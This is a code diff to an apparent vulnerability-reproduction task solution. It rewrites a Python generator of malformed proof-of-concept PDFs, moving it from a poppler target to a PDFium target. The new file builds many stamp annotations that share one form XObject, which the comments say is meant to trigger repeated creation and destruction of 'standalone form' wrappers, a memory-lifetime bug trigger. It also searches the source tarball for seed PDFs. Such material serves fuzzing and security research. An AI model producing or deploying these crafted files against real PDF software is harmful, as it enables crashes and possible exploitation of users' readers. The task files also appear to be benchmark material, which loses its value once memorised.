@@ -1,125 +1,183 @@
 import os
+import io
 import tarfile
-from typing import List, Optional
+from typing import Dict, Optional, Tuple
 
 
-def _tar_contains_keywords(tar_path: str, keywords: List[bytes], max_bytes_per_file: int = 256 * 1024) -> bool:
+def _build_pdf(objects: Dict[int, bytes], root_obj: int) -> bytes:
+    header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
+    body_parts = []
+    offsets: Dict[int, int] = {0: 0}
+
+    cur = len(header)
+    for objnum in sorted(objects.keys()):
+        offsets[objnum] = cur
+        part = (f"{objnum} 0 obj\n".encode("ascii") + objects[objnum] + b"\nendobj\n")
+        body_parts.append(part)
+        cur += len(part)
+
+    body = b"".join(body_parts)
+    xref_offset = len(header) + len(body)
+    max_obj = max(objects.keys()) if objects else root_obj
+
+    xref_lines = []
+    xref_lines.append(f"xref\n0 {max_obj + 1}\n".encode("ascii"))
+    xref_lines.append(b"0000000000 65535 f \n")
+    for i in range(1, max_obj + 1):
+        off = offsets.get(i)
+        if off is None:
+            xref_lines.append(b"0000000000 00000 f \n")
+        else:
+            xref_lines.append(f"{off:010d} 00000 n \n".encode("ascii"))
+    xref = b"".join(xref_lines)
+
+    trailer = (
+        b"trailer\n<< "
+        + f"/Size {max_obj + 1} /Root {root_obj} 0 R ".encode("ascii")
+        + b">>\n"
+    )
+
+    out = (
+        header
+        + body
+        + xref
+        + trailer
+        + b"startxref\n"
+        + str(xref_offset).encode("ascii")
+        + b"\n%%EOF\n"
+    )
+    return out
+
+
+def _pdf_stream(dict_inner: bytes, data: bytes) -> bytes:
+    return b"<< " + dict_inner + b" /Length " + str(len(data)).encode("ascii") + b" >>\nstream\n" + data + b"endstream"
+
+
+def _generate_pdf_poc(num_annots: int = 16) -> bytes:
+    # Shared form XObject stream used multiple ways to maximize chance of creating/destroying multiple standalone form wrappers.
+    app_data = b"q\n0 0 1 rg\n0 0 40 40 re\nf\nQ\n"
+    # page content uses two different XObject names pointing to the same object.
+    contents_data = (
+        b"q 1 0 0 1 20 20 cm /F1 Do Q\n"
+        b"q 1 0 0 1 100 100 cm /F2 Do Q\n"
+        b"q 1 0 0 1 60 60 cm /F1 Do Q\n"
+        b"q 1 0 0 1 140 20 cm /F2 Do Q\n"
+    )
+
+    objects: Dict[int, bytes] = {}
+
+    # Object numbers
+    catalog_obj = 1
+    pages_obj = 2
+    page_obj = 3
+    contents_obj = 4
+    first_annot_obj = 5
+    annot_objs = list(range(first_annot_obj, first_annot_obj + num_annots))
+    app_obj = first_annot_obj + num_annots  # shared appearance/form stream
+
+    # Catalog
+    objects[catalog_obj] = f"<< /Type /Catalog /Pages {pages_obj} 0 R >>".encode("ascii")
+
+    # Pages
+    objects[pages_obj] = f"<< /Type /Pages /Kids [{page_obj} 0 R] /Count 1 >>".encode("ascii")
+
+    # Page
+    annots_array = b"[" + b" ".join(f"{a} 0 R".encode("ascii") for a in annot_objs) + b"]"
+    page_resources = b"<< /XObject << /F1 " + f"{app_obj} 0 R".encode("ascii") + b" /F2 " + f"{app_obj} 0 R".encode("ascii") + b" >> >>"
+    objects[page_obj] = (
+        b"<< /Type /Page /Parent "
+        + f"{pages_obj} 0 R".encode("ascii")
+        + b" /MediaBox [0 0 200 200] /Resources "
+        + page_resources
+        + b" /Contents "
+        + f"{contents_obj} 0 R".encode("ascii")
+        + b" /Annots "
+        + annots_array
+        + b" >>"
+    )
+
+    # Contents stream
+    objects[contents_obj] = _pdf_stream(b"", contents_data)
+
+    # Annotations (Stamp) all sharing the same appearance stream.
+    for idx, aobj in enumerate(annot_objs):
+        x0 = 10 + (idx % 4) * 45
+        y0 = 10 + (idx // 4) * 45
+        x1 = x0 + 30
+        y1 = y0 + 30
+        objects[aobj] = (
+            b"<< /Type /Annot /Subtype /Stamp /P "
+            + f"{page_obj} 0 R".encode("ascii")
+            + b" /Rect ["
+            + f"{x0} {y0} {x1} {y1}".encode("ascii")
+            + b"] /F 4 /AP << /N "
+            + f"{app_obj} 0 R".encode("ascii")
+            + b" >> >>"
+        )
+
+    # Shared appearance XObject form stream
+    objects[app_obj] = _pdf_stream(
+        b"/Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 40 40] /Resources << >>",
+        app_data,
+    )
+
+    return _build_pdf(objects, root_obj=catalog_obj)
+
+
+def _tar_looks_like_pdf_project(src_path: str) -> bool:
+    if not os.path.isfile(src_path):
+        return True
     try:
-        with tarfile.open(tar_path, "r:*") as tf:
-            for m in tf.getmembers():
+        with tarfile.open(src_path, "r:*") as tar:
+            hits = 0
+            checked = 0
+            for m in tar:
+                checked += 1
+                n = m.name.lower()
+                if "pdfium" in n or "fpdf" in n or "cpdf_" in n:
+                    hits += 2
+                if "standaloneform" in n or "standalone_form" in n:
+                    hits += 3
+                if n.endswith(("pdfium_fuzzer.cc", "pdf_fuzzer.cc", "fpdfview.h", "fpdfview_c_api.h")):
+                    hits += 3
+                if checked >= 2000:
+                    break
+            return hits >= 3
+    except Exception:
+        return True
+
+
+def _try_find_pdf_seed_in_tar(src_path: str) -> Optional[bytes]:
+    if not os.path.isfile(src_path):
+        return None
+    best: Optional[Tuple[int, bytes]] = None
+    try:
+        with tarfile.open(src_path, "r:*") as tar:
+            for m in tar:
                 if not m.isfile():
                     continue
-                name = (m.name or "").lower()
-                if any(k.decode(errors="ignore").lower() in name for k in (b"poppler", b"xpdf", b"gfx", b"object.h", b"dict.h")):
-                    return True
-                if m.size <= 0:
+                n = m.name.lower()
+                if not (n.endswith(".pdf") or n.endswith(".fdf")):
                     continue
-                f = tf.extractfile(m)
-                if not f:
+                if m.size <= 0 or m.size > 2_000_000:
                     continue
-                try:
-                    data = f.read(min(m.size, max_bytes_per_file))
-                finally:
-                    try:
-                        f.close()
-                    except Exception:
-                        pass
-                for kw in keywords:
-                    if kw in data:
-                        return True
+                f = tar.extractfile(m)
+                if f is None:
+                    continue
+                data = f.read()
+                if data.startswith(b"%PDF"):
+                    if best is None or len(data) < best[0]:
+                        best = (len(data), data)
     except Exception:
-        return False
-    return False
-
-
-def _pdf_stream_obj(extra_dict_kv: bytes, data: bytes) -> bytes:
-    if not data:
-        length = 0
-        return b"<< " + extra_dict_kv + b" /Length 0 >>\nstream\nendstream\n"
-    length = len(data)
-    return b"<< " + extra_dict_kv + b" /Length " + str(length).encode() + b" >>\nstream\n" + data + b"endstream\n"
-
-
-def _build_pdf(objects: List[bytes]) -> bytes:
-    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
-    out = bytearray(header)
-    offsets = [0]
-    for i, obj in enumerate(objects, start=1):
-        offsets.append(len(out))
-        out += f"{i} 0 obj\n".encode()
-        out += obj
-        if not obj.endswith(b"\n"):
-            out += b"\n"
-        out += b"endobj\n"
-    xref_off = len(out)
-    n = len(objects) + 1
-    out += b"xref\n"
-    out += f"0 {n}\n".encode()
-    out += b"0000000000 65535 f \n"
-    for off in offsets[1:]:
-        out += f"{off:010d} 00000 n \n".encode()
-    out += b"trailer\n"
-    out += f"<< /Size {n} /Root 1 0 R >>\n".encode()
-    out += b"startxref\n"
-    out += str(xref_off).encode() + b"\n"
-    out += b"%%EOF\n"
-    return bytes(out)
-
-
-def _make_poc_pdf() -> bytes:
-    # A minimal PDF that draws a Form XObject with missing /Resources to force inherited resources handling,
-    # then touches resources again immediately afterwards.
-    catalog = b"<< /Type /Catalog /Pages 2 0 R >>\n"
-    pages = b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>\n"
-    page = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources 4 0 R /Contents 5 0 R >>\n"
-
-    resources = (
-        b"<<\n"
-        b"  /Font << /F1 7 0 R >>\n"
-        b"  /XObject << /X1 6 0 R /X2 6 0 R >>\n"
-        b">>\n"
-    )
-
-    content = (
-        b"q\n"
-        b"/X1 Do\n"
-        b"Q\n"
-        b"/X2 Do\n"
-        b"BT\n"
-        b"/F1 12 Tf\n"
-        b"72 72 Td\n"
-        b"(A) Tj\n"
-        b"ET\n"
-    )
-    contents_stream = _pdf_stream_obj(b"", content)
-
-    # Form XObject with missing /Resources
-    form_dict_kv = b"/Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 10 10]"
-    form_stream = _pdf_stream_obj(form_dict_kv, b"")
-
-    font = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\n"
-
-    return _build_pdf([catalog, pages, page, resources, contents_stream, form_stream, font])
+        return None
+    return best[1] if best else None
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Prefer PDF PoC; do a light check that the project looks like poppler/xpdf style.
-        # If detection fails, still return the PDF; many harnesses accept PDFs.
-        try:
-            if os.path.isfile(src_path):
-                _tar_contains_keywords(
-                    src_path,
-                    keywords=[
-                        b"class Object",
-                        b"class Dict",
-                        b"Gfx::",
-                        b"StandAlone",
-                        b"standalone",
-                        b"AcroForm",
-                        b"Form XObject",
-                    ],
-                )
-        except Exception:
-            pass
-        return _make_poc_pdf()
+        seed = _try_find_pdf_seed_in_tar(src_path)
+        if seed is not None and len(seed) <= 100_000:
+            return seed
+        if _tar_looks_like_pdf_project(src_path):
+            return _generate_pdf_poc(num_annots=16)
+        return _generate_pdf_poc(num_annots=24)
